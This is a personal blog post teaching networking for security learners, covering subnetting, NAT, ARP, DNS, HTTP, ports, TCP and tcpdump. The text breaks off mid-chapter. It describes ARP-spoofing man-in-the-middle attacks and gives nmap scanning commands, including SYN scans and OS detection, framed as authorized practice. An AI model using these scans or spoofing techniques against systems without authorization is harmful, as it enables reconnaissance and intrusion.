---
layout: post
title: "Networking"
date: 2026-06-12
categories: tech
---

I'm working through networking the way it actually matters for security — not as abstract theory, but as *how a message travels, how two computers talk, and where every tool and every attack plugs in.* This is one living post: fourteen chapters in four parts. Each chapter fills in with a proper definition as I learn it; the rest say **coming soon** until I get there.

The single idea that ties it all together: **networking is split into floors, each does one job, and every tool and every attack lives on one floor.** Keep that in mind and the rest stops being a pile of acronyms.

> ★ marks the hands-on security chapters — where you stop reading and start *seeing the bytes*.

---

# Foundations

## Layers

Networking is split into floors, and each floor does exactly one job. When I type a URL and hit enter, my request rides an elevator *down* through the floors on my machine, crosses the wire, and rides *up* through the floors on the server. The reply comes back the same way. The reason this matters for security: **every tool and every attack lives on one specific floor** — once I know which floor something operates on, I know what it can and can't see.

The model has two common spellings. The textbook one is the 7-layer **OSI** model; in practice everyone works with the 4-layer **TCP/IP** model, which is what I'll use:

| Floor | Layer (TCP/IP) | Its one job | Address it uses | Lives here |
|-------|----------------|-------------|-----------------|------------|
| 4 (top) | **Application** | what the data *means* | — (names, URLs) | HTTP, DNS, TLS |
| 3 | **Transport** | which *program*, reliable or not | port number | TCP, UDP |
| 2 | **Network** | find the right *machine* across networks | IP address | IP, routing |
| 1 (bottom) | **Link** | move bits across *one* physical hop | MAC address | Ethernet, Wi-Fi, ARP |

The key idea is **encapsulation**: each floor wraps the floor above it in its own envelope. My HTTP request (App) gets stuffed into a TCP segment (Transport), which gets stuffed into an IP packet (Network), which gets stuffed into an Ethernet frame (Link) — envelopes inside envelopes. At the other end each floor opens *only its own* envelope and hands the contents up.

That layering is also the map of the whole rest of this post: the **IP Address** sections live on the **Network** floor, **MAC/ARP** on the **Link** floor, and **HTTP / Ports / TCP / UDP** on **Transport + Application** — and the tools later each tap a specific floor: `tcpdump` reads the Link/Network bytes, `nmap` probes Transport ports, TLS sits at the top of Application.

## IP Addresses

An IP address is how one machine finds another across a network — the **Network floor's** addressing scheme, the postal address of the internet. Routers only ever look at this number to decide where to forward a packet next.

The address you see most is **IPv4**: four numbers `0–255` separated by dots, e.g. `192.168.1.34`. That's 32 bits → about 4.3 billion addresses, which sounded like plenty in the 1980s and ran out in reality (the reason **IPv6** exists — more on that below). An IPv4 address is really two parts glued together:

```
192.168.1.34 / 24
└────┬─────┘ └┬┘
  network    which host
  part       on it
```

The `/24` is the **subnet mask** (CIDR notation) — it says "the first 24 bits are the network, the rest identify the individual machine." Same network part = same local network, talk directly; different network part = the packet has to go through a router. That single split is what the whole Link-vs-Network distinction from the **Layers** section hangs on.

### Why the mask exists at all

The mask earns its keep by answering one question my machine has to settle for *every single packet*: **is this destination on my network, or somewhere else?** Without the mask, an address like `192.168.1.34` is ambiguous — which part is the network and which part is the device? With `/24`, there's no guessing:

| Without the mask | With the mask (`/24`) |
|------------------|------------------------|
| Sees `192.168.1.34` and is stuck — which part is the network? | Knows: `192.168.1` = network, `.34` = device |
| Can't decide: send direct, or hand it to the router? | Decides instantly: same first 3 numbers? → direct. Different? → router. |

It's the old landline problem — without an area code you can't tell a local call from a long-distance one. Same with networks: the mask is what lets the device split any address into **network + device** so it knows whether to talk directly or go through the router. That's the whole purpose.

### Where the `/24` number comes from — why not `/18`?

The `/24` isn't magic, and it isn't required — it's just a **count of bits**. An IP that looks like 4 numbers is really **32 ones-and-zeros**, split into 4 groups of 8:

```
   192    .   168    .    1     .    34
11000000 . 10101000 . 00000001 . 00100010
└──8 bits┘  └──8 bits┘  └──8 bits┘  └──8 bits┘   = 32 bits total
```

The `/number` says **how many bits from the left belong to the network**. Since each number is 8 bits, the clean boundaries fall on whole numbers:

```
/8   = first 1 number  is network   (8 bits)
/16  = first 2 numbers are network  (16 bits)
/24  = first 3 numbers are network  (24 bits)  ← home default
/32  = all 4 numbers = one single address
```

So `/24` = 24 bits = exactly 3 whole numbers — *that's* why `192.168.1` is the network and `.34` is the device. The number literally counts the network bits.

You absolutely *can* use `/18` — it's valid, it just doesn't land on a number boundary, so it cuts through the middle of the 3rd number (16 full bits + 2 leftover) and looks messy. The trade-off is the real lesson: **more network bits = fewer device bits = smaller network.**

| Mask | Network bits | Device bits | Usable devices | Clean? |
|------|--------------|-------------|----------------|--------|
| `/8`  | 8  | 24 | ~16 million | ✅ 1 number |
| `/16` | 16 | 16 | ~65,000 | ✅ 2 numbers |
| `/18` | 18 | 14 | 16,382 | ⚠️ 2.25 numbers — messy |
| `/24` | 24 | 8  | 254 | ✅ 3 numbers |
| `/30` | 30 | 2  | 2 | ✅ tiny — router links |

The device count is `2^(device bits) − 2` (the `−2` drops the network ID and the broadcast address, which can't be assigned to a machine). So `/24` → `2⁸ − 2 = 254` devices — plenty for a home, and easy to read ("same first 3 numbers = same network"). `/18` → `2¹⁴ − 2 = 16,382`, overkill for a house but exactly what a big company or ISP needs. The router picks `/24` for homes because it's clean and 254 addresses is already far more than you'll use.

On any box, the command to see your own addresses is `ip a` (Linux) or `ifconfig` / `ipconfig` (Mac/Windows):

```
$ ip a
2: eth0: ... 
    inet 192.168.1.34/24 ...      ← my IPv4 address + mask
    inet6 fe80::.../64 ...        ← an IPv6 address (the "noise" that matters in the NAT section below)
```

Two addresses you'll always see and should recognise on sight: `127.0.0.1` (**loopback** — "this machine, talking to itself") and the `192.168.x.x` / `10.x.x.x` ranges, which are *private* and never appear on the public internet. *Why* a machine can have a private address inside and a different public one outside is exactly what the next section is about.

## Private vs Public IPs + NAT

Why all your home devices share one internet address.

I was poking at this from two machines on the same home connection — my Mac and a Docker container — and asked each one the same simple question: *what's my public IP?* The trick is the tiny service [`ifconfig.me`](https://ifconfig.me), which just echoes back the address it sees you arriving from:

```
# On either machine:
curl -s ifconfig.me
```

They came back **different**, and the reason is exactly the kind of thing that trips people up.

### What I got

```
Container:  122.167.103.200                              ← an IPv4 public address
Mac:        2401:4900:8901:da7b:3ca3:15c8:99e4:ca0c      ← an IPv6 public address
```

They look totally different — but they're the **same front door**, described in two different languages.

### The two languages: IPv4 vs IPv6

Remember all that `inet6` "noise" in `ip a` that's easy to ignore? This is it coming back to matter.

- **IPv4** — the old, short style: `122.167.103.200` (four numbers, `0–255` each). The world ran out of these; there simply aren't enough for every device on earth.
- **IPv6** — the new, long style: `2401:4900:...` (eight hex groups). Practically unlimited supply. My Indian ISP (`2401:4900` is an Indian mobile/broadband range) hands out both.

My Mac and my container both have internet, and both exit through the same home connection — but when each asked `ifconfig.me` "what's my public address?", they answered in different languages:

- The **container** only has IPv4 networking (its `eth0` is `inet 172.17.0.2`, no public IPv6). So it asked over IPv4 → got the IPv4 answer `122.167.103.200`.
- The **Mac** has IPv6 enabled and *prefers* it (those `2401:4900:...` lines in `ip a`). So it asked over IPv6 → got the IPv6 answer.

Same house, two address systems. Like giving your home address in English vs. in Hindi — different words, same place.

### Prove they're really the same exit — force the Mac to speak IPv4

The `-4` flag forces `curl` to use IPv4:

```
# On the Mac:
curl -s -4 ifconfig.me
```

This prints `122.167.103.200` — matching the container exactly. 🎯 That's the proof: both machines leave through the **same public IP** (`122.167.103.200`, my home router's address), even though *inside* they're `192.168.1.34` and `172.17.0.2` respectively. You can force the other direction too:

```
# On the Mac — force IPv6:
curl -s -6 ifconfig.me     # → the 2401:4900:... address again
```

### The three layers of address

There are actually **three** layers of address in play here, and this experiment surfaced all of them:

| Layer | Container | Mac | What it is |
|-------|-----------|-----|------------|
| **Private internal** | `172.17.0.2` | `192.168.1.34` | inside-only, invisible to the internet |
| **Public IPv4** | `122.167.103.200` | `122.167.103.200` | my home's address, old language |
| **Public IPv6** | *(none)* | `2401:4900:...` | my home's address, new language |

The private addresses are **different** (different internal rooms). The public IPv4 is **identical** (same front door). The Mac just *also* has an IPv6 door the container doesn't. That shared-public-exit-from-different-private-rooms trick is exactly what **NAT** does — the topic this chapter is named for, and what I'll expand next.

## MAC Addresses & ARP

The hardware ID on your local network — and why ARP has no authentication, making it the LAN man-in-the-middle attack surface.

### Two addresses, two different jobs

Every device on a network carries **two** addresses, and they answer different questions. The IP address is *where* — it routes data across networks. The MAC address is *who* — it identifies the exact piece of hardware on the local wire.

| | MAC address | IP address |
|---|-------------|------------|
| Example | `82:4b:d2:f8:aa:1b` | `192.168.1.34` |
| Answers | **WHO** is the device | **WHERE** is the device |
| Layer | Link (Layer 2) | Network (Layer 3) |
| Assigned by | Hardware maker (burned in) | Router / DHCP (changes) |
| Scope | Local network only | Local + across the internet |
| Analogy | Fingerprint | Mailing address |

The big idea: a packet needs **both**. The IP gets it across the internet to *your* network; the MAC delivers it to the *exact device* on the local wire. This is the Link-vs-Network split from the **Layers** chapter made concrete — IP lives on the Network floor, MAC on the Link floor.

### The problem ARP solves

Say my laptop (`192.168.1.34`) wants to send something to the router at `192.168.1.1`. It knows the **IP** — but to actually put a frame on the local wire, the Link floor needs a **MAC**, and it doesn't have one yet. A machine can't deliver anything locally with just an IP; it *must* translate IP → MAC first.

That translator is **ARP** (Address Resolution Protocol). Its one job:

> Give me an IP, I'll find the MAC that owns it.

### How ARP works, step by step

```
My laptop (192.168.1.34) wants to reach 192.168.1.1

1. ARP REQUEST  — a broadcast, sent to EVERYONE on the subnet
   Laptop -> all devices:
   "Who has 192.168.1.1? Tell 192.168.1.34 your MAC."
   (destination MAC = ff:ff:ff:ff:ff:ff  <- the broadcast address)

2. ARP REPLY    — a unicast, only the owner answers
   Router -> laptop:
   "192.168.1.1 is at 0c:36:23:75:9a:f0"

3. CACHE IT     — stored so it won't have to ask again
   This is exactly what `arp -a` displays.
```

A few facts that matter:

- ARP works **only within one subnet** (my `192.168.1.x`). It can't resolve internet addresses — that's the router's job once the frame reaches it.
- The cache **expires** after a few minutes, so the machine re-asks periodically.
- Some entries (like multicast) are permanent and never expire.

### The fatal flaw: no authentication

When a reply arrives saying "`192.168.1.1` is at *some MAC*," the laptop's reaction is simply: *okay, I believe you.* No questions asked. ARP has no password, no signature, no check that the replier is who it claims — and crucially, no check that you even *asked* the question. It accepts **unsolicited replies**.

Why? ARP was designed in 1982 for small, trusted networks where everyone was assumed honest. That assumption is exactly the vulnerability today.

### The attack: ARP spoofing leads to man-in-the-middle

Normally traffic flows straight out:

```
My laptop ---> Router (192.168.1.1) ---> Internet
```

An attacker sends **fake ARP replies** to both sides:

```
To my laptop:  "192.168.1.1  is at [ATTACKER's MAC]"   (lie)
To the router: "192.168.1.34 is at [ATTACKER's MAC]"   (lie)

Both believe it (no verification), so now:

My laptop ---> ATTACKER ---> Router ---> Internet
                  |
            sees ALL my traffic
```

That is a **man-in-the-middle (MITM)** attack. Once in the middle, the attacker can sniff unencrypted traffic (passwords on plain-HTTP sites), modify data in transit, SSL-strip (downgrade HTTPS to HTTP), or hijack sessions.

How you'd spot it: the router's MAC in `arp -a` suddenly changes from its real value to a different one. That's the red flag.

### Defenses

| Defense | What it does | Who uses it |
|---------|--------------|-------------|
| Encryption (HTTPS / VPN) | Intercepted traffic stays unreadable — the number-one protection | Everyone |
| Static ARP entries | Manually pin IP↔MAC: `sudo arp -s 192.168.1.1 0c:36:23:75:9a:f0` | Home power-users |
| Dynamic ARP Inspection (DAI) | Switch verifies replies against a trusted table, drops fakes | Enterprise |
| ARP monitoring (`arpwatch`) | Alerts when an IP's MAC changes | Security-conscious users |
| Network segmentation (VLANs) | Limits who can even send ARP to you | Enterprises |

The practical takeaway: always use HTTPS plus a VPN on public Wi-Fi. Even if someone MITMs you via ARP spoofing, your data stays encrypted and useless to them.

### The complete mental model

```
IP ADDRESS (192.168.1.34) = WHERE
routes data across networks
        |
        |  must become a MAC for local delivery
        v
      [ ARP ]   the translator: IP -> MAC
                (no authentication!)
        |
        v
MAC ADDRESS (82:4b:d2:f8:aa:1b) = WHO
delivers data to the exact device locally

The flaw: ARP trusts ANY reply -> attacker lies ->
traffic reroutes through attacker -> man-in-the-middle
```

## DNS

How names (`google.com`) turn into IP numbers — and how it's abused (spoofing, tunneling).

ARP translates IP → MAC *inside* my network. DNS does the layer above that: it translates **names → IP addresses** across the whole internet. It's the step that happens *before* ARP even gets involved.

### The problem DNS solves

I type `google.com`. But computers don't route on names — they route on IP addresses like `142.250.182.14`. Humans remember names; machines need numbers. **DNS (Domain Name System)** is the internet's phonebook that bridges the two.

```
I type:    google.com          <- human-friendly name
DNS gives: 142.250.182.14       <- machine-routable IP
```

> DNS's one job: give me a name, I'll find its IP address.

It's the exact same pattern as ARP, just one floor up:

| Protocol | Translates | Scope |
|----------|------------|-------|
| DNS | name → IP | whole internet |
| ARP | IP → MAC | local network only |

### The lookup chain, step by step

When I visit `www.example.com`, my computer asks a *chain* of servers. Each one either knows the answer or points to who does.

```
Me -> www.example.com?

1. RESOLVER (my ISP's, or 8.8.8.8)
   "I'll find it for you." Checks its cache first.

2. ROOT server (.)
   "Don't know example.com, but ask the .com servers ->"

3. TLD server (.com)
   "Don't know the IP, but example.com's nameserver is ->"

4. AUTHORITATIVE server (example.com's own)
   "www.example.com is at 93.184.216.34"

5. CACHE IT
   Resolver + my computer store it (TTL) so they won't re-ask.
```

The hierarchy reads **right to left** — that's the order DNS actually resolves it:

```
www  .  example  .  com  .
 |       |          |    |
host   domain      TLD  root
```

### Common record types

| Record | Maps | Example |
|--------|------|---------|
| `A` | name → IPv4 | `example.com` → `93.184.216.34` |
| `AAAA` | name → IPv6 | `example.com` → `2606:2800:220:1::...` |
| `CNAME` | alias → another name | `www.example.com` → `example.com` |
| `MX` | domain → mail server | for email delivery |
| `TXT` | text data | SPF/DKIM (anti-spam), domain verification |
| `NS` | domain → its nameservers | who's authoritative |

### Caching and TTL

Every DNS answer comes with a **TTL (Time To Live)** — how many seconds to cache it before re-asking.

```
example.com  ->  93.184.216.34   TTL=3600   (cache for 1 hour)
```

Caching happens at multiple levels: browser → OS → router → ISP's resolver. This is why DNS changes (like moving a website to a new server) take time to "propagate" — old answers stay cached until their TTL expires.

### The security problems

Like ARP, classic DNS was built for a trusting era — plaintext, no authentication. That opens several attacks:

| Attack | What happens |
|--------|--------------|
| DNS spoofing / cache poisoning | Attacker injects a fake answer, so a real name resolves to a malicious IP |
| DNS hijacking | Malware or a compromised router changes your resolver to an attacker-controlled one |
| MITM on DNS | Requests are plaintext (UDP port 53), so a man-in-the-middle (e.g. via ARP spoofing) can read or alter them |
| DNS tunneling | Attackers smuggle data or C2 traffic hidden inside DNS queries to evade firewalls |

This connects straight back to the **MAC/ARP** chapter: an attacker who's already MITM'd me via ARP spoofing can also tamper with my plaintext DNS — answering `bank.com` → *attacker's IP* and sending me to a phishing clone.

### Defenses

| Defense | What it does |
|---------|--------------|
| DNSSEC | Cryptographically signs DNS records so forged answers are rejected |
| DNS over HTTPS (DoH) | Encrypts DNS queries inside HTTPS (port 443) — can't be read or altered |
| DNS over TLS (DoT) | Encrypts DNS over TLS (port 853) |
| Trusted resolvers | Use reputable ones: `1.1.1.1` (Cloudflare), `8.8.8.8` (Google) |
| HTTPS everywhere | Even if sent to a wrong IP, the TLS cert won't match the name → the browser warns you |

### Hands-on (try these on a Mac)

```
# Look up a domain's IP (modern tool)
dig google.com

# Just the answer, clean
dig +short google.com

# Look up a specific record type
dig MX google.com          # mail servers
dig AAAA google.com        # IPv6
dig TXT google.com         # text records

# Use a specific resolver (Cloudflare) instead of the default
dig @1.1.1.1 google.com

# Reverse lookup: IP -> name
dig -x 8.8.8.8

# The classic macOS tool
nslookup google.com

# See / flush the Mac's DNS cache
sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder

# Which resolver is the Mac using?
scutil --dns | grep nameserver
```

Worth trying: run `dig +short google.com` twice. The second is instant — it was cached. Watch the TTL field in full `dig` output count down between queries.

### The complete mental model

```
I type a NAME (google.com)
        |
      [ DNS ]   name -> IP   (internet phonebook, port 53)
                (plaintext + no auth = spoofable!)
        |
        |  now I have the IP (142.250.182.14)
      [ ARP ]   IP -> MAC    (local delivery, the previous chapter)
        |
        v
packet reaches the right device -> router -> internet
```

---

# Connections

## HTTP

The web's language at the byte level — requests, methods, headers, status codes. The protocol you'll attack most.

### Where HTTP sits

Everything from the chapters above stacks up under HTTP. When I type `https://example.com`, the request rides down through the floors I already know:

```
I type:  https://example.com
      |
   [ HTTP ]   the actual request/response (what page I want, what the server says)
   [ TCP  ]   reliable connection — "the call"
   [ IP   ]   192.168.1.34  -> WHERE (routing)
   [ MAC+ARP] -> WHO (local delivery)
```

HTTP is just the *content* of the conversation. My data still travels MAC → IP → router exactly as before; HTTP rides on top of all of it.

### What HTTP is

HTTP — HyperText Transfer Protocol — is the rules for how a browser (the **client**) asks a web server for things, and how the server answers. It's a simple **request → response** pattern:

```
CLIENT (browser)                    SERVER (website)
     |                                    |
     | ---- "GET me the homepage" ------> |   request
     |                                    |
     | <--- "200 OK, here's the HTML" --- |   response
```

The key trait: HTTP is **stateless** — each request stands alone, and the server doesn't remember me between requests by default. Cookies and tokens are how sites add memory — and a big part of the attack surface.

### HTTP at the byte level

What makes HTTP approachable is that it's just **plain text I can read**. A raw request looks like this:

```
GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session=abc123

(blank line = end of headers)
```

And the raw response:

```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1256
Set-Cookie: session=xyz789

<!DOCTYPE html>
<html>...the page...</html>
```

Every web request I've ever made looks like this underneath. That's the "at the byte level" promise — no magic, just structured text.

### The four building blocks

**1. Methods** — the verb, what I want to do:

| Method | Means | Example use |
|--------|-------|-------------|
| `GET` | "Give me this" | Load a page |
| `POST` | "Here's data, process it" | Submit a login form |
| `PUT` | "Create / replace this" | Update a profile |
| `DELETE` | "Remove this" | Delete an account |
| `HEAD` | "Headers only, no body" | Check if a page exists |
| `PATCH` | "Partially update" | Change one field |
| `OPTIONS` | "What can I do here?" | Check allowed methods |

*Security angle:* attackers probe which methods are allowed. A `DELETE` or `PUT` left open can let them modify or delete data they shouldn't.

**2. Headers** — the metadata, `Key: Value` lines carrying context:

- Request: `Host:` (which site — vital, one server hosts many), `User-Agent:` (browser/device), `Cookie:` (session/login token), `Authorization:` (credentials/tokens).
- Response: `Content-Type:` (HTML, JSON, image), `Set-Cookie:` (server hands me a session), `Location:` (redirect target), and security headers like `Content-Security-Policy` and `Strict-Transport-Security`.

*Security angle:* headers are a huge attack surface — manipulating `Cookie`, `Host`, `Referer`, or `X-Forwarded-For` is the basis of session hijacking, host header injection, and more.

**3. Status codes** — the server's 3-digit reply. Memorize the categories:

| Range | Meaning | Common examples |
|-------|---------|-----------------|
| `1xx` | Info | `100 Continue` |
| `2xx` | Success | `200 OK`, `201 Created`, `204 No Content` |
| `3xx` | Redirect | `301 Moved`, `302 Found`, `304 Not Modified` |
| `4xx` | Your fault | `400 Bad Request`, `401 Unauthorized`, `403 Forbidden`, `404 Not Found`, `429 Too Many Requests` |
| `5xx` | Server's fault | `500 Internal Error`, `502 Bad Gateway`, `503 Unavailable` |

*Security angle:* status codes leak information. `401` vs `403` vs `404` can reveal whether a resource exists — attackers use this to map hidden pages (enumeration). `500` errors may leak stack traces.

**4. Body** — the payload, the actual data: HTML, JSON, form data, file uploads. `GET` usually has no body; `POST`/`PUT` carry data here.

*Security angle:* the body is where injection attacks live — SQL injection, XSS payloads, and malicious JSON all travel in the body.

### HTTP vs HTTPS

This ties straight back to the ARP/MITM chapter:

| | HTTP | HTTPS |
|---|------|-------|
| Encrypted? | No — plain text | Yes — encrypted (TLS) |
| Port | 80 | 443 |
| MITM risk | Anyone in the middle can read it | Intercepted traffic is unreadable |

Remember the ARP spoofing attack? If an attacker MITMs me and I'm on HTTP, they read everything — passwords, cookies, messages. On HTTPS they just see encrypted garbage. That's exactly why HTTPS defeats the ARP attack from the earlier chapter — it all connects.

### Hands-on with curl

```
# See the full request + response headers
curl -v https://example.com
# The > lines are the request, the < lines are the response —
# methods, headers, and the status code, live.

# See ONLY response headers (status code + headers)
curl -I https://example.com        # -> HTTP/2 200, Content-Type:, etc.

# Watch a redirect (3xx) in action
curl -IL http://github.com         # -> 301 HTTP->HTTPS, then 200

# Make different methods
curl -X POST https://httpbin.org/post -d "user=test&pass=123"
# httpbin echoes back exactly what you sent — great for learning.

# Trigger status codes on purpose
curl -I https://httpbin.org/status/404    # -> 404
curl -I https://httpbin.org/status/500    # -> 500
curl -I https://httpbin.org/status/301    # -> 301
```

`httpbin.org` is a free practice server designed for learning HTTP — safe to experiment on.

### Why "the protocol you'll attack most"

The web runs on HTTP, so most security testing targets it. Common HTTP-based attack classes (for defensive understanding):

| Attack | What it abuses |
|--------|----------------|
| SQL injection | Malicious input in the request body/params |
| XSS (cross-site scripting) | Injected scripts in input → run in victims' browsers |
| CSRF | Tricking my browser into sending authenticated requests |
| Session hijacking | Stealing the `Cookie` header's session token |
| Parameter tampering | Changing values (price, user ID) in requests |
| Header injection | Abusing `Host`, `X-Forwarded-For`, etc. |
| Directory enumeration | Using status codes to find hidden pages |

To attack *or* defend any of these, I have to read HTTP fluently — methods, headers, status codes, body. That's why this chapter is foundational.

> Ethics reminder: practice HTTP attacks only on systems you own or are authorized to test — intentionally-vulnerable labs like `httpbin.org`, DVWA, the PortSwigger Web Security Academy, or OWASP Juice Shop. Never test sites you don't have permission for.

## Ports

One computer runs many programs; a port says which program a message is for.

### What a port actually is

An IP address gets data to the right *machine*. But one machine runs dozens of programs at once — a browser, an email client, Spotify, a database. A **port** is a number (`0–65535`) that says which *program* on that machine a message is for.

```
IP address  ->  WHICH computer   (the building)
Port number ->  WHICH program    (the apartment number)
```

So a full destination is always `IP : Port`:

```
142.250.182.14 : 443      <- Google's server, the HTTPS program
```

### The port number ranges

| Range | Name | Used for |
|-------|------|----------|
| `0–1023` | Well-known ports | Standard services (HTTP, SSH, DNS). Need admin/root to bind. |
| `1024–49151` | Registered ports | Apps registered with IANA (e.g. `3306` MySQL, `8080` dev servers) |
| `49152–65535` | Dynamic / ephemeral | Temporary ports the OS picks for outgoing connections |

### Ports worth memorizing

| Port | Service | Protocol | Notes |
|------|---------|----------|-------|
| `20/21` | FTP | TCP | File transfer (insecure, plaintext) |
| `22` | SSH | TCP | Secure remote shell — huge in security |
| `23` | Telnet | TCP | Remote shell, plaintext (dead/insecure) |
| `25` | SMTP | TCP | Sending email |
| `53` | DNS | UDP/TCP | Name resolution |
| `80` | HTTP | TCP | Web (unencrypted) |
| `110` | POP3 | TCP | Receiving email |
| `143` | IMAP | TCP | Receiving email |
| `443` | HTTPS | TCP | Web (encrypted) — the most important |
| `445` | SMB | TCP | Windows file sharing (common attack target) |
| `3306` | MySQL | TCP | Database |
| `3389` | RDP | TCP | Windows Remote Desktop |
| `8080` | HTTP-alt | TCP | Proxies / dev web servers |

Knowing the service behind a port is half of recon. An open `445` screams "Windows file sharing — check for exploits"; an open `3389` means "remote desktop — try credential attacks."

### Source vs destination port

Every connection has *two* ports. When my laptop browses Google:

```
My laptop                           Google server
192.168.1.34 : 51324    ------->    142.250.182.14 : 443
(random ephemeral port)             (well-known HTTPS port)
```

The **destination** port is fixed and known (`443` = HTTPS). My **source** port is random/ephemeral — it's how my OS tracks which of my many connections a reply belongs to. When Google replies, it sends to `192.168.1.34:51324`, and my OS routes that data back to the right browser tab.

## TCP vs UDP + the Handshake

Reliable vs fast. The SYN → SYN-ACK → ACK 3-way handshake. The 5-tuple.

Ports are addresses. **TCP** and **UDP** are the two transport protocols that actually move data to those ports, and they make opposite trade-offs.

### Reliable vs fast

| | TCP | UDP |
|---|-----|-----|
| Full name | Transmission Control Protocol | User Datagram Protocol |
| Philosophy | Reliable — guarantees delivery | Fast — fire and forget |
| Connection | Connection-oriented (handshake first) | Connectionless (just send) |
| Ordering | Packets reassembled in order | No ordering guarantee |
| Error check | Retransmits lost packets | Lost packets are just... lost |
| Speed | Slower (overhead) | Faster (no overhead) |
| Analogy | Phone call (both confirm, in order) | Postcard (send, hope it arrives) |
| Used by | Web, SSH, email, file transfer | Streaming, gaming, DNS, VoIP, video calls |

Why both exist: loading a webpage can't tolerate a missing byte → TCP. A live video call would rather drop one frame than freeze waiting for it → UDP.

### The TCP 3-way handshake

Before TCP sends data, both sides agree to talk. This is the famous SYN → SYN-ACK → ACK:

```
CLIENT                                    SERVER
  |                                          |
  | ----------- SYN ---------------------->  |  "Can we talk? Here's my
  |           (seq=x)                         |   starting sequence number x"
  |                                          |
  | <---------- SYN-ACK -------------------   |  "Yes. I got x (ack=x+1).
  |          (seq=y, ack=x+1)                 |   Here's my number y"
  |                                          |
  | ----------- ACK ---------------------->  |  "Got your y (ack=y+1).
  |           (ack=y+1)                       |   Let's go!"
  |                                          |
  | ======= CONNECTION ESTABLISHED =======   |
  | <---------- data flows ----------->       |
```

- **SYN** (synchronize): client asks to connect, sends its sequence number.
- **SYN-ACK**: server agrees, acknowledges the client's number, and sends its own.
- **ACK**: client acknowledges the server's number → the connection is open.

There's also a 4-way teardown to close it (FIN → ACK → FIN → ACK).

The security relevance: the **SYN flood** attack (a DoS) sends thousands of SYNs but never the final ACK, leaving the server holding half-open connections until it's exhausted. Nmap's **SYN scan** (`-sS`) sends a SYN, reads the reply, then never completes — a stealthy way to find open ports without a full connection.

### The 5-tuple

A single server (e.g. `:443`) handles thousands of simultaneous clients. How does it keep them apart? Every connection is uniquely identified by **5 values** — the 5-tuple:

```
1. Protocol         (TCP or UDP)
2. Source IP        (192.168.1.34)
3. Source Port      (51324)
4. Destination IP   (142.250.182.14)
5. Destination Port (443)
```

If even one value differs, it's a different connection. This is how my laptop can have two tabs open to the same Google server — same destination IP+port, but different source ports make them distinct.

## Open Ports / What's Listening

Every open port is a possible door in. Core security skill.

The principle: **every open port is a program listening for connections — and therefore a possible door in.**

### What "listening" means

A program that accepts connections **binds** to a port and waits — we say it's *listening*. Three states matter:

| State | Meaning | Security view |
|-------|---------|---------------|
| Open / listening | A service is actively accepting connections | A potential entry point — attack surface |
| Closed | Nothing listening; machine actively refuses | No service, but the host is alive |
| Filtered | A firewall is silently dropping packets | Can't tell what's behind it |

### Why this is the heart of recon and defense

- **Attacker's view:** "What's running on this box? Each open port is a service I can fingerprint, version-check, and look for exploits against." This is the port-scanning phase of every penetration test.
- **Defender's view:** "What am I exposing that I shouldn't be?" The number-one hardening rule is *reduce attack surface* — close every port you don't need. A forgotten open database port (`3306`) or RDP (`3389`) is how breaches start.

### Check what's listening on my own machine

```
# macOS / Linux — list listening ports + the program owning each
sudo lsof -iTCP -sTCP:LISTEN -n -P

# Linux (modern) — sockets, listening only, with process
sudo ss -tulpn
#   -t tcp  -u udp  -l listening  -p process  -n numeric

# Older but universal
netstat -an | grep LISTEN

# macOS: what specific process is on port 5000?
sudo lsof -i :5000
```

Reading typical output: `node ... *:3000 (LISTEN)` means a Node app is listening on port 3000 on all interfaces. The bind address matters: `*:3000` or `0.0.0.0:3000` = listening on all network interfaces (reachable from outside — riskier), while `127.0.0.1:3000` = localhost only (only this machine can reach it — much safer).

### Scan what's open on another machine — nmap

Nmap is *the* port scanner. (Only scan machines you own or have written permission to test.)

```
# Basic scan of the most common 1000 ports
nmap 192.168.1.1

# Scan a specific port range
nmap -p 1-1000 192.168.1.1

# Scan ALL 65535 ports
nmap -p- 192.168.1.1

# Service + version detection (what's actually running)
nmap -sV 192.168.1.1

# Stealthy SYN scan + OS detection + versions (needs sudo)
sudo nmap -sS -sV -O 192.168.1.1

# Scan the whole local network to find live hosts
nmap -sn 192.168.1.0/24
```

What a scan tells me:

```
PORT     STATE  SERVICE   VERSION
22/tcp   open   ssh       OpenSSH 8.9      <- brute-force / known CVE?
80/tcp   open   http      nginx 1.18       <- check the web app
443/tcp  open   https     nginx 1.18
3306/tcp open   mysql     MySQL 8.0        <- database exposed! should this be public?
```

This chapter is also where the `nmap` work in **Scanning with nmap** later picks up.

---

# Seeing & Probing

## Watching Real Traffic (tcpdump / Wireshark) ★

Actually seeing the bytes on the wire. Packet capture is the disassembler of the network.

Packet capture is the disassembler of the network. Just as a disassembler shows the actual machine instructions a program runs, a packet sniffer shows the actual bytes crossing the wire — not what an app *claims* it sent, but what it really sent.

### How sniffing works

A network card normally ignores traffic not addressed to it. A sniffer puts the card into **promiscuous mode** (wired) or **monitor mode** (Wi-Fi) so it captures everything it can see, then decodes each packet layer by layer:

```
Raw bytes on the wire
   |
   |- Layer 2: Ethernet  -> src MAC, dst MAC
   |- Layer 3: IP        -> src IP, dst IP, TTL
   |- Layer 4: TCP/UDP   -> src port, dst port, flags (SYN/ACK...)
   |- Layer 7: HTTP/DNS  -> the actual content (if unencrypted)
```

The crucial limit: I can only capture traffic that physically reaches my card. On a switched network I mostly see my own traffic plus broadcasts. To see *others'* traffic I'd need a SPAN/mirror port, a hub, or to be MITM (e.g. ARP spoofing) — which is exactly why sniffing and spoofing go hand in hand.

### tcpdump — the command-line sniffer

Fast, scriptable, on almost every system. Format: `tcpdump [options] [filter expression]`.

```
# List capture interfaces
sudo tcpdump -D

# Capture on the Wi-Fi interface, show packets
sudo tcpdump -i en0

# Don't resolve names/ports (faster, clearer) + be verbose
sudo tcpdump -i en0 -nn -v

# Only port 80 (HTTP) traffic
sudo tcpdump -i en0 -nn port 80

# Only traffic to/from one host
sudo tcpdump -i en0 -nn host 192.168.1.1

# Only DNS queries (port 53)
sudo tcpdump -i en0 -nn port 53

# Capture only TCP SYN packets (new connection attempts)
sudo tcpdump -i en0 -nn 'tcp[tcpflags] & tcp-syn != 0'

# Show packet CONTENTS in ASCII (see HTTP, etc.)
sudo tcpdump -i en0 -nn -A port 80

# Save to a file for later analysis in Wireshark
sudo tcpdump -i en0 -w capture.pcap

# Read a saved capture back
tcpdump -r capture.pcap -nn
```

Reading a line:

```
12:30:45.123 IP 192.168.1.34.51324 > 142.250.182.14.443: Flags [S], seq 12345...
            |   |--source IP.port-|   |--dest IP.port---|        |
